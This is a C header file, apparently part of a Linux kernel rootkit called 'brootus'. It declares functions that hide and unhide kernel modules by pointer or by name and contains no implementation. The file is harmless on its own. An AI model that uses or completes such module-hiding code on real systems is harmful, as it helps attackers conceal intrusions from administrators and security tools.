#ifndef MODULE_HIDING_H
#define MODULE_HIDING_H

#include "brootus.h"

BROOTUS_MODULE(module_hiding);

extern void hide_module(struct module* mod);
extern void unhide_module(struct module* mod);
extern void set_module_hidden(char* name);
extern void set_module_visible(char* name);

#endif